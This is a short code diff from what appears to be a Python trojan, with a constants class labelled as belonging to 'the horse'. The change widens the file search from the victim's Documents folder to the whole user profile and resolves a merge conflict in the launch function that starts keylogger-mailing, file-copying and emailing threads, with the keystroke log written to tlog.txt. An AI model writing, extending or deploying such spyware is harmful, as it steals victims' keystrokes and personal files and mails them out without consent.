@@ -146,7 +146,7 @@ class Constants(object):
     """Contains the Constants for the horse"""
     USER_NAME = os.getlogin()
     USER_PATH = r'C:\Users' + "\\" + USER_NAME
-    SEARCH_ROOT = USER_PATH + r"\Documents"
+    SEARCH_ROOT = USER_PATH #+ r"\Documents"
     ROOT = r"C:"
     LOG_FILE_LOCATION = os.path.join(USER_PATH, r"Documents\tlog.txt")
     APPEND_MODE = 'a'
@@ -459,19 +459,16 @@ def kickOff():
     keylogger_mail_thread.start()
     stop_keylogger_mail_thread.start()
 
-<<<<<<< HEAD
-    #Start the threads for file copy
-    searching_thread.start()
-    stop_searching_thread.start()
+
+
 
     #Start the threads for emailing
-=======
     # Start the threads for file copy
     searching_thread.start()
     stop_searching_thread.start()
 
     # Start the threads for emailing
->>>>>>> origin/master
+
     email_thread.start()
     
 
